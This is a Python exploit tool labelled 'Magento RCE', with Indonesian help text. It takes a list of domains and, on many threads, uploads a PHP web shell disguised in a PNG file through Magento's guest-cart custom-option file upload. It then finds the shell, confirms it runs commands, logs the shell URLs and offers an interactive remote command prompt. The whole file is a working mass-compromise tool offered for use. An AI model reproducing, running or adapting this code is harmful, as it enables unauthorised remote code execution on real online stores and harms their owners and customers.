import requests
import base64
import random
import string
import argparse
import threading
import queue
import time
import sys
import struct
import zlib
from urllib.parse import urlparse

SHELL_PASSWORD = 'c'
WEB_SHELL_PAYLOAD = f'''<?php
if(isset($_REQUEST['{SHELL_PASSWORD}'])) {{
    $cmd = $_REQUEST['{SHELL_PASSWORD}'];
    echo "<pre>";
    system($cmd);
    echo "</pre>";
}} else {{
    echo "Web Shell Active. Use ?{SHELL_PASSWORD}=command";
}}
?>'''

JSON_HEADERS = {"Accept": "application/json", "Content-Type": "application/json"}

output_lock = threading.Lock()
successful_shells = []

def add_protocol(url):
    if not urlparse(url).scheme:
        return "https://" + url
    return url

def create_valid_png_with_payload(payload):
    png_signature = b'\x89PNG\r\n\x1a\n'
    
    width = 1
    height = 1
    bit_depth = 8
    color_type = 2
    compression = 0
    filter_method = 0
    interlace = 0
    
    ihdr_data = struct.pack('>IIBBBBB', width, height, bit_depth, color_type, 
                           compression, filter_method, interlace)
    ihdr_chunk = struct.pack('>I', len(ihdr_data)) + b'IHDR' + ihdr_data
    ihdr_chunk += struct.pack('>I', zlib.crc32(ihdr_chunk[4:]) & 0xffffffff)
    
    raw_data = b'\x00\x00\x00\x00'
    compressed_data = zlib.compress(raw_data)
    idat_chunk = struct.pack('>I', len(compressed_data)) + b'IDAT' + compressed_data
    idat_chunk += struct.pack('>I', zlib.crc32(idat_chunk[4:]) & 0xffffffff)
    
    comment_text = f"Comment\x00{payload}".encode('latin-1')
    text_chunk = struct.pack('>I', len(comment_text)) + b'tEXt' + comment_text
    text_chunk += struct.pack('>I', zlib.crc32(text_chunk[4:]) & 0xffffffff)
    
    iend_chunk = struct.pack('>I', 0) + b'IEND'
    iend_chunk += struct.pack('>I', zlib.crc32(iend_chunk[4:]) & 0xffffffff)
    
    return png_signature + ihdr_chunk + idat_chunk + text_chunk + iend_chunk

def test_and_upload_shell(base_url, timeout=30):
    try:
        SHELL_FILENAME = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8)) + '.php'
        
        print(f"[*] Target: {base_url}")
        
        try:
            malicious_png = create_valid_png_with_payload(WEB_SHELL_PAYLOAD)
            b64_payload = base64.b64encode(malicious_png).decode()
        except Exception as e:
            b64_payload = base64.b64encode(WEB_SHELL_PAYLOAD.encode()).decode()
        
        session = requests.session()
        session.timeout = timeout
        session.verify = False
        requests.packages.urllib3.disable_warnings()
        
        resp = session.post(base_url + "/graphql", 
                           headers=JSON_HEADERS, 
                           json={"query": "{ products(search: \"\", pageSize: 1) { items { sku } } }"},
                           timeout=timeout)
        
        if resp.status_code != 200:
            return False, None
            
        data = resp.json()
        if 'data' not in data or 'products' not in data['data'] or not data['data']['products']['items']:
            return False, None
            
        sku = data['data']['products']['items'][0]['sku']
        
        resp = session.post(base_url + "/rest/default/V1/guest-carts", 
                           headers=JSON_HEADERS, timeout=timeout)
        
        if resp.status_code != 200:
            return False, None
            
        cart_id = resp.json()
        
        json_body = {
            "cart_item": {
                "product_option": {
                    "extension_attributes": {
                        "custom_options": [
                            {
                                "extension_attributes": {
                                    "file_info": {
                                        "base64_encoded_data": b64_payload,
                                        "name": SHELL_FILENAME,
                                        "type": "image/png"
                                    }
                                },
                                "option_id": "12345",
                                "option_value": "file"
                            }
                        ]
                    }
                },
                "qty": 1,
                "sku": sku
            }
        }
        
        resp = session.post(f"{base_url}/rest/default/V1/guest-carts/{cart_id}/items", 
                           headers=JSON_HEADERS, 
                           json=json_body, 
                           timeout=timeout)
        
        time.sleep(2)
        
        paths_to_check = [
            f"/pub/media/custom_options/quote/{SHELL_FILENAME[0]}/{SHELL_FILENAME[1]}/{SHELL_FILENAME}",
            f"/media/custom_options/quote/{SHELL_FILENAME[0]}/{SHELL_FILENAME[1]}/{SHELL_FILENAME}",
            f"/pub/media/custom_options/quote/{SHELL_FILENAME[0]}/{SHELL_FILENAME}",
            f"/media/custom_options/quote/{SHELL_FILENAME[0]}/{SHELL_FILENAME}",
            f"/pub/media/custom_options/quote/{SHELL_FILENAME}",
            f"/media/custom_options/quote/{SHELL_FILENAME}",
            f"/pub/media/import/{SHELL_FILENAME}",
            f"/media/import/{SHELL_FILENAME}",
            f"/pub/media/tmp/catalog/product/{SHELL_FILENAME}",
            f"/media/tmp/catalog/product/{SHELL_FILENAME}",
            f"/pub/media/custom_options/quote/{cart_id}/{SHELL_FILENAME}",
            f"/media/custom_options/quote/{cart_id}/{SHELL_FILENAME}",
        ]
        
        for path in paths_to_check:
            try:
                full_url = base_url + path
                resp = session.get(full_url, timeout=timeout)
                if resp.status_code == 200:
                    test_cmd = "echo ShellActive"
                    test_url = f"{full_url}?{SHELL_PASSWORD}={test_cmd}"
                    resp = session.get(test_url, timeout=timeout)
                    
                    if resp.status_code == 200 and "ShellActive" in resp.text:
                        print(f"\n[!!!] WEB SHELL DEPLOYED: {full_url}\n")
                        return True, full_url
            except:
                continue
                
        return False, None
        
    except requests.exceptions.Timeout:
        return False, None
    except Exception as e:
        return False, None

def execute_command(shell_url, command, password='c', timeout=30):
    try:
        session = requests.session()
        session.verify = False
        resp = session.get(f"{shell_url}?{password}={command}", timeout=timeout)
        if resp.status_code == 200:
            return resp.text
        return None
    except Exception as e:
        return f"Error: {e}"

def worker(target_queue, timeout, output_file):
    while True:
        try:
            domain = target_queue.get(timeout=1)
            if domain is None:
                break
                
            base_url = add_protocol(domain.strip())
            success, shell_url = test_and_upload_shell(base_url, timeout)
            
            if success and shell_url:
                with output_lock:
                    successful_shells.append({
                        'domain': base_url,
                        'shell_url': shell_url,
                        'password': SHELL_PASSWORD
                    })
                    with open(output_file, 'a') as f:
                        f.write(f"[DOMAIN] {base_url}\n")
                        f.write(f"[SHELL] {shell_url}\n")
                        f.flush()
            
            target_queue.task_done()
            
        except queue.Empty:
            break
        except Exception as e:
            print(f"Worker error: {e}")
            target_queue.task_done()

def interactive_shell(shell_url, password='c'):
    print("\n" + "="*20)
    print("INTERACTIVE SHELL MODE")
    print("="*20)
    print(f"Shell URL: {shell_url}")
    
    while True:
        try:
            cmd = input(f"$ ").strip()
            if cmd.lower() == 'exit':
                break
            elif cmd.lower() == 'help':
                print("\nAvailable commands:")
                print("  whoami  - Current user")
                print("  id      - User ID info")
                print("  pwd     - Current directory")
                print("  ls      - List files")
                print("  uname -a - System info")
                print("  exit    - Exit shell\n")
                continue
            elif not cmd:
                continue
                
            result = execute_command(shell_url, cmd, password)
            if result:
                print(result)
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"Error: {e}")

def main():
    parser = argparse.ArgumentParser(description='Magento RCE')
    parser.add_argument('-f', '--file', required=True, help='File berisi list domain (satu per baris)')
    parser.add_argument('-t', '--threads', type=int, default=5, help='Jumlah thread (default: 5)')
    parser.add_argument('-o', '--output', default='shells.txt', help='File output untuk shell URL')
    parser.add_argument('--timeout', type=int, default=30, help='Timeout per request dalam detik')
    parser.add_argument('-i', '--interactive', action='store_true', help='Mode interaktif setelah upload')
    
    args = parser.parse_args()
    
    try:
        with open(args.file, 'r') as f:
            domains = [line.strip() for line in f if line.strip()]
    except Exception as e:
        sys.exit(1)
    
    target_queue = queue.Queue()
    for domain in domains:
        target_queue.put(domain)
    
    threads = []
    start_time = time.time()
    
    for i in range(args.threads):
        t = threading.Thread(target=worker, args=(target_queue, args.timeout, args.output))
        t.daemon = True
        t.start()
        threads.append(t)
    
    processed = 0
    total = len(domains)
    while any(t.is_alive() for t in threads):
        current_processed = total - target_queue.qsize()
        if current_processed > processed:
            processed = current_processed
            sys.stdout.write(f"\r[*] Progress: {processed}/{total} domains | Shells Deployed: {len(successful_shells)}")
            sys.stdout.flush()
        time.sleep(1)
    
    for t in threads:
        t.join(timeout=2)
    
    elapsed_time = time.time() - start_time
    
    print(f"[*] Time elapsed: {elapsed_time:.2f} seconds")
    print(f"[*] Domains tested: {len(domains)}")
    print(f"[*] Shells deployed: {len(successful_shells)}")
    
    if successful_shells:
        print(f"\n[✓] Shell URLs saved to: {args.output}")
        for idx, shell in enumerate(successful_shells, 1):
            print(f"\n[{idx}] Domain: {shell['domain']}")
            print(f"    Shell URL: {shell['shell_url']}")
            print(f"    Example: {shell['shell_url']}?{shell['password']}=whoami")
        
        if args.interactive and len(successful_shells) > 0:
            choice = input(f"\nSelect shell for interactive mode (1-{len(successful_shells)}) or 'n' to skip: ")
            if choice.isdigit() and 1 <= int(choice) <= len(successful_shells):
                selected = successful_shells[int(choice)-1]
                interactive_shell(selected['shell_url'], selected['password'])

if __name__ == "__main__":
    requests.packages.urllib3.disable_warnings()
    main()